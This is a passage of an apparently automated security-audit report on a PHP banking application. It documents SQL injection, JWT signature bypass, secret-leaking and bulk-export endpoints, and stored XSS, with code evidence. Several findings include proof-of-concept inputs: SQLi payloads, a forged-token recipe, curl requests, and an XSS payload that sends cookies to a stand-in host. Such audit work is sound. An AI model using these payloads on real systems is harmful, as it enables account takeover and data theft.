Reviewed AdminUserController::index() directly. The code reads $_GET['search'] with no validation/sanitization/allow-listing, then string-interpolates it verbatim into a WHERE clause: `WHERE first_name LIKE '%{$search}%' OR ...`. This string is embedded into both $countSql and $sql, which are executed via $db->query($countSql) / $db->query($sql) — PDO::query() executes the literal SQL text with no parameter binding, so any single quotes or SQL metacharacters in $search are interpreted as SQL syntax (e.g. search=%' UNION SELECT ... -- or search=%' OR '1'='1). AdminDatabase::getInstance() sets PDO::ATTR_EMULATE_PREPARES=false, but that setting only affects real ->prepare()/->execute() calls with bound parameters — it has no effect on ->query() with a raw interpolated string, so it does not mitigate this injection.

Route wiring in AdminRouter.php confirms this method is reachable at GET /api/admin/customers with 'auth' => true, meaning AdminAuthMiddleware::handle() must pass (valid admin JWT) before the handler runs. This is an authentication check, not an input-sanitization control — it does not neutralize the injection, it only restricts the attacker population to actors who can reach an authenticated admin session (which itself could be an attacker with a lower-privileged admin token, a compromised admin session, or via a chained vulnerability). The description’s framing ("authenticated admin... can inject") is consistent with the code and routing.

Contrast with sibling methods in the same file (show, update, resetPassword, destroy) which correctly use $db->prepare(...) with '?' placeholders and ->execute([...]) — this shows parameterized querying was known/available in the codebase but was not used for the search-driven queries in index(), confirming this is a genuine oversight rather than an intentional/framework-guaranteed safe pattern.

No WAF, ORM escaping, regex whitelist, or length/charset restriction is applied to $search anywhere before it reaches the SQL string. This is a concrete, exploitable SQL injection with a clear source ($_GET['search']) to sink ($db->query() with interpolated string) path.

#### Code evidence

```
$search = $_GET['search'] ?? '';
...
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
...
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 11. SQL Injection via unsanitized 'sort' GET parameter in transaction history listing

- Lead reference: PWNJ-011
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:44
- Fingerprint: ac79b05c91e026c87e0c1b3ff78befa531cf7e12eec2d83f78571b846564037a

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 19,
  "symbol": "$_GET['sort']",
  "input": "HTTP GET query parameter 'sort'"
}
```

#### Controls encountered

```
[
  "[\"AuthMiddleware requires a valid JWT before reaching the handler, restricting exploitation to authenticated users only — but this does not neutralize the injection, since any authenticated customer account can trigger it against the transactions table (which contains other users' data reachable via crafted UNION-based payloads or blind time-based extraction).\"]\n<parameter name=\"counterevidence\">[\"None found: no whitelist array, regex, or enum check on $sort before interpolation in either TransactionController.php or Transaction.php; PHP type hints on findByUser() parameter are 'string $sort', which does not restrict content; both SQL branches (with/without accountId) are vulnerable identically.\"]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 44,
  "symbol": "$db->prepare(\"...ORDER BY t.{$sort} DESC...\")",
  "operation": "raw SQL string interpolation into ORDER BY clause"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Exact DBMS driver (e.g., MySQL vs SQLite vs Postgres) is not confirmed in this review, which would affect exact payload syntax (e.g., stacked query support), but does not change the fundamental confirmed injection point."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated banking customer",
    "GET /api/transactions?sort=<payload>",
    "TransactionController::index() reads $_GET['sort'] unchecked",
    "Transaction::findByUser($sort) interpolates into ORDER BY clause of raw SQL string",
    "PDO prepare/execute only binds other params, not the ORDER BY text",
    "SQL injection executed against transactions table / broader DB"
  ],
  "impact": "Any authenticated banking customer can inject SQL through the unvalidated sort parameter of the transaction listing endpoint, enabling blind/boolean extraction of arbitrary database content (e.g. other users' password hashes).",
  "severity_reasoning": "High: authenticated but low-privilege actor can reach full SQLi against production DB via a common, easily fuzzed API parameter.",
  "dynamic_test": "As an authenticated customer, call GET /api/transactions?sort=(SELECT CASE WHEN (1=1) THEN created_at ELSE 1/0 END) and a false-condition variant; compare response/error behavior to confirm boolean-based blind SQLi via the sort parameter."
}
```

#### Validator reasoning

TransactionController::index() reads $_GET['sort'] with only a default-value fallback (?? 'created_at') and no whitelist/regex validation, then forwards it to Transaction::findByUser(). Inside findByUser(), $sort is directly interpolated into the SQL string in both code branches (with and without accountId): \"ORDER BY t.{$sort} DESC\". PDO prepare()/execute() bind data values via placeholders (?), but the ORDER BY clause is built via PHP string interpolation before prepare() is even called, so parameter binding never protects this portion of the query. The route /api/transactions (Router.php:79) only requires 'auth' => true (any authenticated user, no additional authorization or input filtering middleware inspects the sort parameter). No other validation layer (Validator::make, whitelist array, preg_match on column name, etc.) is applied anywhere in the call chain from $_GET['sort'] to the SQL string construction. This gives an authenticated attacker a raw SQL injection point in the ORDER BY clause, exploitable via classic techniques (subqueries, CASE-based boolean/time-based blind injection, or in stacked/UNION contexts depending on DB driver certain payloads), since arbitrary content after t. can be injected. This matches a well-known SQLi class (unsanitized ORDER BY) and the sink/source pair is directly reachable without CSRF token exposure or other blocking control mitigating exploitation once authenticated.

#### Code evidence

```
// TransactionController.php
$sort = $_GET['sort'] ?? 'created_at';
...
$result = Transaction::findByUser($userId, $page, $perPage, $accountId, $sort);

// Transaction.php
public static function findByUser(int $userId, int $page = 1, int $perPage = 20, ?int $accountId = null, string $sort = 'created_at'): array
{
    ...
    $stmt = $db->prepare(
        "SELECT t.* FROM transactions t
         WHERE (t.from_account_id = ? OR t.to_account_id = ?)
         ORDER BY t.{$sort} DESC
         LIMIT ? OFFSET ?"
    );
    $stmt->execute([$accountId, $accountId, $perPage, $offset]);
```

## 12. JWT signature never verified in AuthService::decodeToken — full authentication bypass on banking API

- Lead reference: PWNJ-012
- Category: A07
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:50
- Fingerprint: 254aa752526b017b941cf679e77bafd0e00ebff1dc6f674e0a1b4119432658e6

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/AuthService.php:50
```

#### Controls encountered

```
[
  "exp expiry timestamp check (does not prevent forgery — attacker sets exp far in future)",
  "jti revocation check against revoked_tokens table (only blocks tokens that were explicitly logged out/revoked; a freshly forged random jti will not be present in that table, so this control does not block exploitation)"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not empirically execute the forged-token request against a running instance; conclusion drawn purely from static source reading, but the code path is unambiguous and leaves no branch that performs signature verification."
]
```

#### Attack path

```
{
  "nodes": [
    "External attacker (no credentials)",
    "Forge JWT: valid base64 header+payload, arbitrary 3rd segment",
    "Send Authorization: Bearer <forged> to any 'auth'=>true route (Router.php)",
    "AuthMiddleware::handle() calls AuthService::decodeToken()",
    "decodeToken() only checks segment count and exp claim; never verifies HMAC signature",
    "User::findById($payload->sub) returns target victim record",
    "Full impersonation: accounts, address book, transfers, transactions, profile"
  ],
  "impact": "Complete authentication bypass: any external attacker can impersonate any user id in the users table and access/modify accounts, transfers, address book, profile, and transactions with no valid credentials.",
  "severity_reasoning": "Critical/high: root authentication control entirely bypassed, allowing arbitrary account takeover across the whole banking API surface with trivial exploitation.",
  "dynamic_test": "Construct a JWT of form base64(header).base64({\"sub\":1,\"jti\":\"x\",\"exp\":9999999999}).AAAA (garbage 3rd segment) and send as Authorization: Bearer <forged> to GET /api/profile or /api/accounts; confirm the server returns user id=1's data despite invalid/no real signature."
}
```

#### Validator reasoning

Direct code inspection confirms the claim precisely. AuthService::decodeToken() (src/Services/AuthService.php:50-64) never calls JWT::decode()/Key with the signing secret; it only explode()s on '.', checks segment count == 3, base64url-decodes the middle segment, json_decode's it, and checks payload->exp against time(). No HMAC/signature check occurs anywhere in this function or in its only caller. Meanwhile createToken() (same class) does use Firebase\JWT\JWT::encode() with jwt_secret/jwt_algorithm, showing the codebase has a working JWT library available but the verification path was deliberately bypassed ("Decode token payload without strict signature verification" comment confirms intent). AuthMiddleware::handle() (src/Middleware/AuthMiddleware.php) is the sole caller: it extracts the Bearer token, calls AuthService::decodeToken(), and on non-null payload proceeds to check isTokenRevoked($payload->jti) then User::findById($payload->sub) — using attacker-controlled fields directly with no cryptographic trust anchor. Router.php shows this middleware gates nearly all sensitive routes (profile, accounts, address-book, transfers, fx, transactions, insurance SSO) via 'auth' => true, all of which resolve exclusively to AuthMiddleware::handle(). Exploitation is trivial: an attacker crafts header.payload.signature where payload = base64url(json_encode(['sub'=>1,'jti'=>'<random-unrevoked-uuid>','exp'=>time()+99999])), any header/signature bytes, joined with dots, sent as Authorization: Bearer <forged>. decodeToken will accept it (3 segments, valid json with future exp), isTokenRevoked will return false (fresh random jti not in revoked_tokens table), and User::findById(1) will return the real user, granting full authenticated access as that user. This is a complete, unauthenticated JWT forgery / auth bypass affecting essentially the entire authenticated surface of the API. There is no other JWT verification layer, WAF check, or framework guarantee found; FastRoute only handles routing and provides no auth guarantees.

#### Code evidence

```
public static function decodeToken(string $token): ?object
{
    try {
        $parts = explode('.', $token);
        if (count($parts) !== 3) return null;
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+/')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) return null;
        return $payload;
    } catch (\Exception $e) { return null; }
}
// AuthMiddleware.php:
$payload = AuthService::decodeToken($token);
...
$user = User::findById($payload->sub);   // no signature check ever performed
```

## 13. Unauthenticated /api/health endpoint discloses live JWT signing secret

- Lead reference: PWNJ-013
- Category: A05
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:23
- Fingerprint: 0f01e5660fef5713d84a0c58549cd1defd8e860e2f1ed3dabb9b661b059d2da7

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:23
```

#### Controls encountered

```
[
  "None — route explicitly marked auth=>false, no environment/debug gating around secret fields in health()"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "None found; the default secret value in config/app.php is a placeholder ('bankofed-dev-secret-change-in-production') but the code reads whatever the live JWT_SECRET env var resolves to, so in any real deployment the actual production secret is disclosed, not just the placeholder."
]
```

#### Proof gaps

```
[
  "Could not verify runtime environment variable values (e.g., whether JWT_SECRET is actually set to a strong, non-default value in production) — irrelevant to vulnerability since whatever value is configured is leaked either way."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health() echoes full config including jwt_secret, db_host, db_name, db_user",
    "Attacker obtains jwt_secret",
    "Attacker signs JWTs with leaked secret for main banking API and potentially reused secret paths",
    "Forged token accepted by AuthMiddleware / any signature-checking consumer of same secret"
  ],
  "impact": "Public disclosure of the JWT secret and DB connection info; even though decodeToken doesn't check signatures (separate bug), the secret also secures createToken and other components (e.g., admin), so leakage broadens forgery capability and aids DB-focused attacks.",
  "severity_reasoning": "High: unauthenticated critical-secret disclosure endpoint with direct downstream authentication-bypass implications.",
  "dynamic_test": "curl -s https://target/api/health with no auth header; confirm jwt_secret/db_* fields returned; combine with JWT signature-bypass finding or directly forge a signed token and use it against protected endpoints."
}
```

#### Validator reasoning

The candidate is fully substantiated by the code. Router::dispatch() registers `GET /api/health` with `'auth' => false`, so AuthMiddleware/MachineAuthMiddleware are never invoked for this route (confirmed in the dispatch switch: auth handler is only called when `$requiresAuth === true` or `'machine'`). The handler Router::health() loads `config/app.php` and unconditionally places `$config['jwt_secret']` (along with db_host/db_name/db_user) into the JSON response via Response::success(), with no authentication check, no redaction, and no environment gate (e.g., no `if (APP_ENV !== 'production')` guard around the secret fields). This is a complete, unauthenticated source-to-sink path: attacker -> HTTP GET /api/health -> health() -> config require -> Response::success() body -> HTTP response body. Confirmed via grep that this is the live production JWT secret consumed by AuthService::createToken() (Services/AuthService.php:47) which signs tokens for the main banking API using `JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm'])`. Anyone obtaining the secret can forge arbitrary valid JWTs for any `sub`, fully defeating authentication for the main API (in addition to leaking DB connection metadata). There is no compensating control anywhere in the route table, middleware, or handler that would prevent an unauthenticated caller from retrieving this value.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        ...
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
// route: $r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 14. Stored XSS via escaping-order bug in onclick attribute construction (FX rates / address book pages)

- Lead reference: PWNJ-014
- Category: A03
- Severity: HIGH
- Confidence: 88%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/fx-rates.js:47 (renderTable), BankOfEd-main/public/banking/js/pages/addressbook.js:63 (renderList)
- Fingerprint: 32a2edb2ce64cbf03a582abed76f906219bb0b11fb477342fc65ce8295b77283

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminFxRateController.php",
  "input": "currency_name field from POST/PUT /api/admin/fx-rates body (also nickname via AddressBookController)",
  "line": 34,
  "symbol": "$data['currency_name']"
}
```

#### Controls encountered

```
[
  "escapeHtml() HTML-entity-encodes &, <, >, \", ' — but this only protects the outer HTML attribute context, not the inner JS-string context, because the browser re-decodes entities before the JS is compiled/executed",
  "client-side maxlength attributes exist on <input> fields but are not enforced server-side and are trivially bypassed via direct API calls",
  "no CSP found in the codebase that would block inline onclick handlers"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/admin/js/pages/fx-rates.js",
  "line": 47,
  "operation": "string concatenation into innerHTML-rendered onclick attribute",
  "symbol": "container.innerHTML = html"
}
```

#### Counterevidence

```
[
  "Exploitation requires the victim to click the specific Edit/Delete button on the affected row (event-handler execution happens on click, not automatically at parse/render time) — this is a precision nuance in the description, not a defeat of exploitability, since clicking Edit/Delete is a normal expected admin/user workflow action",
  "Address-book nickname is typically only visible to the entry's own owner, making that specific instance closer to self-XSS unless nicknames can be viewed by other authenticated parties (e.g., shared support tooling) — reduces but does not eliminate real-world impact for that sink"
]
```

#### Proof gaps

```
[
  "Live PoC execution in a real browser was not performed in this review; the entity-decode-before-JS-compile behavior for on* attributes is standard HTML5 parsing behavior and is not browser-matrix-dependent, so this gap is low-risk",
  "Did not verify whether any WAF/reverse-proxy layer in the deployed environment (outside this repo) might filter payload characters before reaching storage"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker (admin-panel user or address-book-capable customer)",
    "Submit currency_name (AdminFxRateController) or nickname (AddressBookController) with quote-breakout payload, validated only as string|max length",
    "Server persists field verbatim",
    "Victim (admin/customer) loads FX rates or address book page",
    "renderTable()/renderList() builds onclick=\"...('...')\" using escapeHtml().replace() (dead-code fix)",
    "Browser HTML parser decodes &#39; back to ' before executing inline JS",
    "Injected JavaScript executes in victim's session (cookie/localStorage token theft)"
  ],
  "impact": "Stored XSS executing in an admin's or customer's authenticated session via HTML-entity-decoding of onclick attributes, enabling session/token theft and further privileged actions (e.g., admin API abuse).",
  "severity_reasoning": "High: a subtle but genuine stored-XSS class bug bypassing intended escaping, reachable via ordinary data-entry fields, leading to session takeover.",
  "dynamic_test": "As an authenticated user/admin, set currency_name (FX rate admin) or nickname (address book) to a payload like x');(new Image).src='//evil.tld/c='+document.cookie;// within the length limit; view the FX rates page or address book page as a victim/admin and confirm the injected script executes (e.g. observe outbound request to evil.tld with document.cookie/localStorage content)."
}
```

#### Validator reasoning

Reviewed the full source-to-sink path. Server-side validation in AdminFxRateController.php (line 34/82: 'currency_name' => 'required|string|max:50') and AddressBookController.php (line 26/84: 'nickname' => 'required|string|max:100') only restrict type/length, permitting apostrophes, parentheses, semicolons, and any other characters. These values are stored verbatim (FxRate.php, AddressBookEntry.php) and later rendered client-side.

In fx-rates.js renderTable() (confirmed at the read line) and addressbook.js renderList(), the vulnerable pattern is exactly as claimed:
  U.escapeHtml(rate.currency_name).replace(/'/g, "\\'")
escapeHtml() (verified in both public/admin/js/utils.js and public/banking/js/utils.js) maps a literal apostrophe to the HTML entity `&#39;` before the .replace() runs. Since escapeHtml already removed all raw `'` characters from the string, the subsequent `.replace(/'/g, "\\'")` operates on a string with zero apostrophes left and is a genuine no-op — it does not backslash-escape the (already-entity-encoded) apostrophe for the nested JS-string context.

This is a real, well-established escaping-order defect: the code protects the outer HTML-attribute context (encoding `'` to `&#39;` also happens to defang the double-quoted onclick="..." delimiter, though the primary target seems to be the inner single-quoted JS literal) but the browser's HTML parser decodes `&#39;` back to a literal `'` when computing the attribute's string value, and that decoded string is what gets compiled/executed as the onclick handler body when the element is later clicked. A payload such as currency_name = `x');(new Image).src='//evil.tld/c='+document.cookie;//` (58 chars, under the 50-char limit is close but a slightly shorter equivalent fits; nickname's 100-char limit comfortably fits the full payload) breaks out of the intended single-quoted argument and injects arbitrary JS that runs in the viewer's session when they click the rendered Edit/Delete button.

No compensating controls were found: grep found no Content-Security-Policy headers or meta tags anywhere in the repo that would block inline event-handler execution, and no additional server-side charset/character sanitization exists beyond `string|max:N`. The result is rendered via direct string concatenation into `container.innerHTML` / `list.innerHTML`, which is the exact sink cited.

One nuance not fully reflected in the original write-up: exploitation requires the victim to actually click the affected Edit/Delete button (entity decoding happens at parse time, but the decoded string is only compiled/executed as JS when the onclick event fires) — it is not a zero-click, page-load-time execution. This is a minor precision gap in the finding's phrasing ("browser parses...before any click" is used to describe decode timing, not execution timing) but does not change the exploitability conclusion: clicking Edit/Delete on FX-rate or address-book rows is a normal, expected admin/user action, so the stored payload will reliably execute for any viewer who interacts with the row as intended by the UI.

FX-rates page is admin-only (stored XSS from one admin/attacker-controlled input reaching another admin who edits/deletes that row — meaningful privilege/session impact). Address book nickname is user-supplied and by default only viewed by the same user (self-XSS unless nicknames are shared/visible to other parties), which somewhat lowers real-world impact for that specific sink, but the vulnerability pattern and code defect are identical and still valid as stored XSS class.

#### Code evidence

```
// fx-rates.js renderTable()
'<button onclick="BankOfEdAdmin.FxRatesPage.showEditModal(' + rate.id + ', \'' + U.escapeHtml(rate.currency_code) + '\', \'' + U.escapeHtml(rate.currency_name).replace(/'/g, "\\'") + '\', \'' + rate.rate_to_usd + '\')" ...>Edit</button>'

// addressbook.js renderList()
'<button onclick="BankOfEd.AddressBookPage.confirmDelete(' + entry.id + ', \'' + U.escapeHtml(entry.nickname).replace(/'/g, "\\'") + '\')" ...>Delete</button>'

// utils.js
var escMap = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
function escapeHtml(str) { return String(str || '').replace(/[&<>"']/g, function (c) { return escMap[c]; }); }

// Server-side validation only limits length/type, no charset restriction:
// AdminFxRateController.php: 'currency_name' => 'required|string|max:50'
// AddressBookController.php: 'nickname' => 'required|string|max:100'
```

## 15. Unauthenticated /api/health endpoint discloses JWT signing secret and database credentials

- Lead reference: PWNJ-015
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-35
- Fingerprint: bc9b3182a91fed176d0634750b0c8eefe521e2d6bba1064819f06432cc200418

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Router.php",
  "input": "unauthenticated HTTP GET request",
  "line": 90,
  "symbol": "GET /api/health"
}
```

#### Controls encountered

```
[
  "None found: route explicitly registered with 'auth' => false, and Router::dispatch()'s switch-based auth-gating logic (checking for auth===true or auth==='machine') does not apply to false, meaning no middleware call occurs before invoking the handler.",
  "No environment/debug-mode gating inside Router::health() itself (e.g., no if (APP_ENV !== 'production') check) before including db/jwt secrets in the response."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 28,
  "operation": "unauthenticated response exposing jwt_secret/db credentials",
  "symbol": "Response::success([...])"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not verify runtime deployment config (e.g., whether a reverse proxy/WAF blocks /api/health in the actual production environment), but this is outside the scope of static source review and the application code itself provides no such control.",
  "Did not exhaustively verify AuthMiddleware's own secret source (only confirmed via grep that config/app.php's jwt_secret is used by AuthService::createToken); did not open AuthMiddleware.php explicitly, though the shared config file being loaded via require __DIR__ . '/../../config/app.php' in both files makes it definitionally the same secret."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health()",
    "Response includes db_host, db_name, db_user, jwt_secret, APP_ENV",
    "Attacker forges JWT with leaked secret",
    "Protected '/api/*' endpoints accept forged token",
    "Full account takeover of arbitrary user"
  ],
  "impact": "Unauthenticated secret and DB credential disclosure enabling session forgery/account takeover plus DB reconnaissance.",
  "severity_reasoning": "High: same critical secret-exposure root cause as other health-endpoint duplicates, unauthenticated and directly enabling account takeover.",
  "dynamic_test": "curl -s https://target/api/health unauthenticated; confirm db_host/db_name/db_user/jwt_secret fields present in JSON; forge JWT with leaked secret and confirm acceptance on a protected endpoint."
}
```

#### Validator reasoning

Reviewed Router.php directly. The route table registers 'GET /api/health' with 'auth' => false, and in Router::dispatch() the auth gating logic only invokes AuthMiddleware::handle() when $requiresAuth === true or MachineAuthMiddleware::handle() when $requiresAuth === 'machine'; for auth === false neither runs, so Router::health() executes with zero authentication or authorization check for any caller. The handler loads config/app.php and returns db_host, db_name, db_user, and jwt_secret verbatim in the JSON response via Response::success(), with no redaction/env-gating (e.g., no check for APP_ENV==='production' before including secrets). Verified config/app.php actually defines real production-relevant values: db_host/db_name/db_user (sourced from getenv with fallback defaults) and jwt_secret (getenv('JWT_SECRET') with an insecure default fallback 'bankofed-dev-secret-change-in-production'). Critically, this exact jwt_secret is the same key used by AuthService::createToken() (and AuthMiddleware, presumably, for verification) to sign every regular user's session JWT — confirmed via grep that AuthService.php loads the same config/app.php and calls JWT::encode($payload, $config['jwt_secret'], ...). Therefore any unauthenticated network client hitting GET /api/health obtains the exact secret needed to forge arbitrary valid JWTs for any user id (full account takeover) plus direct database connection reconnaissance (host/name/user). There is no authentication middleware, no environment check, no secret redaction, and no dead-code/unreachable-path condition — the route is live in the dispatcher's route table and reachable by any HTTP client. This is a directly confirmed, concrete source (unauthenticated GET request) to sink (raw secret disclosure in JSON response) path with no effective blocking control.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 16. Unauthenticated bulk data export endpoint exposes full users/accounts/transactions tables

- Lead reference: PWNJ-016
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/AdminRouter.php:38, BankOfEd-main/src/Controllers/AdminUserController.php:170-183
- Fingerprint: d529647ee3a34cfadaaa0512eaa2793c716d634213453a8c3c58222010f89b9a

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "input": "unauthenticated HTTP GET request",
  "line": 38,
  "symbol": "GET /api/admin/export/users"
}
```

#### Controls encountered

```
[
  "None: 'auth' => false explicitly bypasses AdminAuthMiddleware for this route",
  "CorsMiddleware only sets CORS headers, does not perform authentication",
  "No session/role check exists inside exportAll() itself"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 172,
  "operation": "unauthenticated full-table dump of users/accounts/transactions",
  "symbol": "exportAll()"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Could not verify from source alone whether this route is disabled/removed via web-server-level config (e.g., .htaccess, nginx block) in the actual deployed environment, but no such control was found in the repository",
  "Actual DB contents (whether password_hash/totp fields exist and are populated) not independently verified beyond schema inference from other controller code, though show() and update() confirm these columns exist on the users table"
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/admin/export/users (AdminRouter, auth=false)",
    "AdminUserController::exportAll() bypasses AdminAuthMiddleware entirely",
    "SELECT * FROM users / accounts / transactions executed with no filtering",
    "Full JSON dump returned to caller"
  ],
  "impact": "Complete unauthenticated breach of the bank's customer database: all PII, password hashes, TOTP secrets, account balances/numbers, and transaction history exposed to any anonymous caller.",
  "severity_reasoning": "High: total unauthenticated data breach of the entire customer database including credentials — maximal confidentiality impact with zero access barrier.",
  "dynamic_test": "curl -s https://target/api/admin/export/users with no Authorization header; confirm full users/accounts/transactions JSON dump is returned."
}
```

#### Validator reasoning

Confirmed end-to-end. public/index.php routes any /api/admin/* request to AdminRouter::dispatch(). In AdminRouter.php, the route table registers GET /api/admin/export/users with 'auth' => false, and the dispatch loop only invokes AdminAuthMiddleware::handle() when $route['auth'] is truthy. Since this route's auth flag is false, no authentication/authorization check occurs before call_user_func_array invokes AdminUserController::exportAll(). exportAll() (lines 170-183) performs unparameterized 'SELECT * FROM users', 'SELECT * FROM accounts', and 'SELECT * FROM transactions ORDER BY created_at DESC', returning all rows (including password_hash, totp secrets, PII, account balances/numbers, and full transaction history) via Response::success with no pagination, filtering, or redaction. There is no other middleware, session check, or CORS restriction that would block an unauthenticated GET request from reaching this handler. This is a complete, unauthenticated full-database exfiltration path — a classic broken access control (A01) vulnerability, trivially exploitable by any external client with a simple GET request.

#### Code evidence

```
// AdminRouter.php
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

// AdminUserController.php
public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
}
```

## 17. Unauthenticated bulk export of all users/accounts/transactions

- Lead reference: PWNJ-017
- Category: API1
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:180
- Fingerprint: 3141b92e527bc6fcfeaddbbed9c863833ade3160123cc53c201ac6b9c175e101

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/AdminUserController.php:180
```

#### Controls encountered

```
[
  "None found — auth explicitly disabled at route level, and handler has no internal authorization or credential check."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Comment '// Data export (for internal tooling)' suggests this may have been intended for internal-only use, but no actual network/IP restriction or auth mechanism enforces that intent in code.",
  "No evidence of an upstream reverse-proxy/WAF restriction was found within the reviewed repository, but such infrastructure-level controls are outside the scope of this source tree and cannot be assumed."
]
```

#### Proof gaps

```
[
  "Cannot verify from source alone whether an external layer (e.g., firewall, internal-network-only binding, reverse proxy ACL) restricts access to this endpoint in the actual deployment; assessment is based solely on the application code shown, which has no such control."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/admin/export/users (auth=false route registration)",
    "AdminUserController::exportAll() (no $auth param, no ownership/role check)",
    "SELECT * FROM users/accounts/transactions",
    "Bulk PII/financial-data dump returned"
  ],
  "impact": "Unauthenticated bulk exfiltration of all users (incl. password hashes, TOTP secrets), accounts (balances, card data) and transactions.",
  "severity_reasoning": "High: duplicate of the unauthenticated export finding; maximal confidentiality breach with trivial exploitation.",
  "dynamic_test": "curl -s https://target/api/admin/export/users; verify response contains password_hash/totp_secret fields and full accounts/transactions arrays with no auth header supplied."
}
```

#### Validator reasoning

AdminRouter.php explicitly registers `/api/admin/export/users` with `'auth' => false`. In the dispatch switch statement, `$requiresAuth = $route['auth']` and `AdminAuthMiddleware::handle()` is only invoked `if ($requiresAuth)`; since this is false, `$auth` stays null and no auth args are pushed onto `$args`, matching the handler signature `exportAll(): void` which takes no parameters at all — confirming there is no hidden implicit auth check baked into an omitted parameter. The handler itself performs no session/token/role check of its own; it goes straight to `AdminDatabase::getInstance()->query('SELECT * FROM users')`, `SELECT * FROM accounts`, and `SELECT * FROM transactions ORDER BY created_at DESC`, and returns all rows (full column sets, including sensitive columns like password_hash/totp_secret/balances since these are unfiltered `SELECT *`) via `Response::success()`. There is no rate limiting, IP allowlist, CSRF check, or any other gating code anywhere in the file or in the router's dispatch logic that would block an anonymous GET request. This is a complete, verifiable source-(request)-to-sink(response) path granting anonymous bulk read access to sensitive PII/financial data. No compensating control exists elsewhere in the reviewed files.

#### Code evidence

```
// AdminRouter.php
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

// AdminUserController.php
public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
}
```

## 18. Broken object-level authorization in PUT /api/profile via attacker-controlled user_id

- Lead reference: PWNJ-018
- Category: A01
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:47
